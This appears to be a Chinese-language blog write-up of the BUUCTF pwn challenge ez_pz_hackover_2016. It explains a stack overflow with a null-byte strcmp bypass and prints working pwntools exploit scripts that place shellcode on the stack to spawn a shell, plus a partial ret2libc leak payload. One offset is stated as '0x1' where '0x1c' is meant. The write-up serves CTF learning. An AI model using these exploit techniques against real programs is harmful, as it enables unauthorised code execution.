@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>BUUCTF Pwn Ez_pz_hackover_2016 | NiceSeven&#39;s Website</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <link rel="stylesheet" href="/css/fonts.css" />
+    
+  </head>
+
+  <body>
+    <nav>
+    <ul class="menu">
+      
+      <li><a href="/">Home</a></li>
+      
+      <li><a href="/about/">About</a></li>
+      
+      <li><a href="/categories/">Categories</a></li>
+      
+      <li><a href="/tags/">Tags</a></li>
+      
+      <li><a href="/">Links</a></li>
+      
+    </ul>
+    <hr/>
+    </nav>
+
+<div class="article-meta">
+<h1><span class="title">BUUCTF Pwn Ez_pz_hackover_2016</span></h1>
+<h2 class="author">NiceSeven</h2>
+<h2 class="date">2020/03/29</h2>
+</div>
+
+<main>
+<h1 id="buuctf-pwn-ez_pz_hackover_2016">BUUCTF Pwn Ez_pz_hackover_2016</h1>
+<p>考点</p>
+<p>1、计算不同函数栈的距离</p>
+<p>2、生成shellcode</p>
+<p>3、栈溢出</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200329171855344.png" alt="image-20200329171855344"></p>
+<p>32位，保护基本没开，可以栈执行、栈溢出</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200329172007648.png" alt="image-20200329172007648"></p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200329174400968.png" alt="image-20200329174400968"></p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200329172901172.png" alt="image-20200329172901172"></p>
+<p>漏洞主要在chall()函数和vuln()函数中</p>
+<p>首先会打印出s的地址也就是栈开始的地址，然后strlen()计算我们传入的字符串的长度到\x00截止，memchr()主要功能是把传入的字符串到\n之后的数据置为0，\n之前的不影响，然后打印出我们传入的数据，最后我们需要绕过strcmp()也就是我们传入的数据要与crashme相同，这里可以使用\x00截断绕过，也就是我们传入的数据最开始8个字节要为&quot;crashme\x00&quot;，绕过之后我们就可以进去vuln函数，vuln函数里面就是执行memcpy()，将存我们输入的s里面的内容传给dest最多可以传0x400字节，但是dest栈大小只有0x32所以这里可以造成栈溢出</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200329174431799.png" alt="image-20200329174431799"></p>
+<p>这里的问题关键就是我们怎么getshell，回顾此程序的防护措施和chall函数中的fget，我们可以发现s的栈大小有0x40c，fgets可以读1023和字节到s栈中，没开启NX所以我们可以传个shellcode到s栈上，我们要注意chall函数中的memchr(&amp;s, &lsquo;\n&rsquo;, v0)的作用是把到\n之后的数据截断，在\n之前的不受影响，所以我们可以构造“crashme\x00+shellcode+\n&quot;,那么我们的shellcode就存在栈上了</p>
+<p>所以思路就是首先把shellcode传到栈上，然后通过溢出dest返回到shellcode在s栈上的地址执行shellcode，所以就出现了两个问题</p>
+<p>1、我们要读多少个字节到s中可以使得vuln函数中执行memcpy的时候可以把dest的ret覆盖</p>
+<p>2、shellcode在栈中的地址怎么确定</p>
+<p>对于第1个问题我们可以通过gdb-peda+pattern小工具来进行调试发现</p>
+<p>首先用pattern生成随机字符串写入脚本中</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+context(log_level <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">debug</span><span style="color:#e6db74">&#39;</span>,os<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">linux</span><span style="color:#e6db74">&#39;</span>,arch<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">i386</span><span style="color:#e6db74">&#39;</span>)
+p <span style="color:#f92672">=</span> process(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./ez_pz_hackover_2016</span><span style="color:#e6db74">&#39;</span>)
+gdb<span style="color:#f92672">.</span>attach(p)<span style="color:#75715e">#先要在sendline之前打开gdb调试，若是在sendline之后无法调试</span>
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&gt; </span><span style="color:#e6db74">&#39;</span>)
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">crashme</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#75715e">#为了过memcpy，过了memcpy才有机会执行vuln函数</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">AAA</span><span style="color:#e6db74">%</span><span style="color:#e6db74">AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA</span><span style="color:#e6db74">&#39;</span><span style="color:#75715e">#使用pattern生成</span>
+pause()<span style="color:#75715e">#把程序暂停在这里，可以理解为下断点</span>
+p<span style="color:#f92672">.</span>sendline(payload)
+</code></pre></div><p>运行脚本后跳出gdb调试</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200329210713118.png" alt="image-20200329210713118"></p>
+<p>因为传入了许多垃圾数据所以我们按c程序运行到vuln函数会出错，根据报错我们可以发现vuln函数中栈的ebp被垃圾数据AnAA覆盖了，</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200329212011155.png" alt="image-20200329212011155"></p>
+<p>可以发现memcpy(&amp;dest, &amp;src, n)之后传入到dest的数据到ebp的距离是8+14这里的8是最开始传入的crashme\x00这个8个字节，然后因为retn之前有leave指令，所以实际覆盖到ret还需要+4(32位程序)</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200329212745096.png" alt="image-20200329212745096"></p>
+<p>所以要memcpy到dest的数据要8+14+4=26个字节才能覆盖到retn</p>
+<p>所以payload = &lsquo;crashme\x00' + &lsquo;a&rsquo;*14 + &lsquo;a'*4 +  shellcode_addr</p>
+<p>那么shellcode的地址如何确定呢？</p>
+<p>因为我们传入的shellcode的传到s栈上的，程序开始又给了我们s栈的地址了，所以我们可以利用给出的栈地址做基地址来计算到shellcode的偏移来得出shellcode的地址，虽然地址会随机化但是偏移量不会变</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+context(log_level <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">debug</span><span style="color:#e6db74">&#39;</span>,os<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">linux</span><span style="color:#e6db74">&#39;</span>,arch<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">i386</span><span style="color:#e6db74">&#39;</span>)
+p <span style="color:#f92672">=</span> process(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./ez_pz_hackover_2016</span><span style="color:#e6db74">&#39;</span>)
+<span style="color:#75715e">#p = remote(&#39;node3.buuoj.cn&#39;, 29530)</span>
+
+gdb<span style="color:#f92672">.</span>attach(p)
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">crash: </span><span style="color:#e6db74">&#39;</span>)
+stack_addr <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">10</span>), <span style="color:#ae81ff">16</span>)<span style="color:#75715e">#获取题目给我们的s栈开始地址</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">crashme</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">18</span> <span style="color:#75715e">#8+18=26</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> asm(shellcraft<span style="color:#f92672">.</span>sh())
+<span style="color:#75715e">#p32(0)是ret的地址，但是我们还不知道具体的地址所以这里用00 00 00 00来模拟调试</span>
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&gt; </span><span style="color:#e6db74">&#39;</span>)
+p<span style="color:#f92672">.</span>sendline(payload)
+pause()
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200330013801557.png" alt="image-20200330013801557"></p>
+<p>可以看到我们传入的shellcode是从jhh开始</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200330011937903.png" alt="image-20200330011937903"></p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200330012017732.png" alt="image-20200330012017732"></p>
+<p>esp和ebp可以确定一个栈空间，所以x/40s $esp就是查看从esp栈顶开始往后的40个地址的数据</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200330012034106.png" alt="image-20200330012034106"></p>
+<p>从上面的调试可以看出shellcode的地址是0xffd77af0，而题目给出的s栈开始地址为0xffd77b0c</p>
+<p>s栈开始到shellcode的偏移为0xffd77b0c-0xffd77af0=0x1也就是28</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200330012312977.png" alt="image-20200330012312977"></p>
+<p>所以我们可以构造最终的exp</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
+<span style="color:#75715e">#-*- coding=UTF-8 -*-</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+context(os<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">linux</span><span style="color:#e6db74">&#39;</span>,arch<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">i386</span><span style="color:#e6db74">&#39;</span>,log_level <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">debug</span><span style="color:#e6db74">&#39;</span>)
+sh <span style="color:#f92672">=</span> process(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./ez_pz_hackover_2016</span><span style="color:#e6db74">&#39;</span>)
+<span style="color:#75715e">#sh = remote(&#39;node3.buuoj.cn&#39;,29530)</span>
+
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./ez_pz_hackover_2016</span><span style="color:#e6db74">&#39;</span>)
+shellcode <span style="color:#f92672">=</span> asm(shellcraft<span style="color:#f92672">.</span>sh())
+<span style="color:#75715e">#gdb.attach(sh)</span>
+
+sh<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Yippie, lets crash: </span><span style="color:#e6db74">&#39;</span>)
+stack_addr <span style="color:#f92672">=</span> int(sh<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">10</span>),<span style="color:#ae81ff">16</span>)<span style="color:#75715e">#接收s栈地址</span>
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">crashme</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">26</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>) <span style="color:#75715e">#加crashme\x00共26个字节，其余用\x00补</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(stack_addr<span style="color:#f92672">-</span><span style="color:#ae81ff">0x1c</span>) <span style="color:#f92672">+</span> shellcode
+<span style="color:#75715e">#shellcode的地址是&amp;s-0x1c</span>
+sh<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&gt;</span><span style="color:#e6db74">&#39;</span>)
+sh<span style="color:#f92672">.</span>sendline(payload)
+<span style="color:#75715e">#pause()</span>
+sh<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">cat flag</span><span style="color:#e6db74">&#39;</span>)
+sh<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200330014620587.png" alt="image-20200330014620587"></p>
+<p>方法2.利用ret2libc，栈溢出retn到printf_plt，构造栈，打印出got_printf，然后在getshell</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">leak_payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">crashme</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">26</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)
+leak_payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">printf</span><span style="color:#e6db74">&#39;</span>])<span style="color:#75715e">#retn到printf()</span>
+leak_payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(chall_addr) <span style="color:#75715e">#printf的返回地址</span>
+leak_payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span>  p32(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">printf</span><span style="color:#e6db74">&#39;</span>]) <span style="color:#75715e">#printf的参数</span>
+sh<span style="color:#f92672">.</span>sendline(leak_payload)
+</code></pre></div>
+</main>
+
+  <footer>
+  
+  
+  <hr/>
+  © <a href="/">NiceSeven</a> 2017 &ndash; 2020 | <a href="https://github.com/NiceSeven">Github</a> |
+  
+  </footer>
+  </body>
+</html>
+
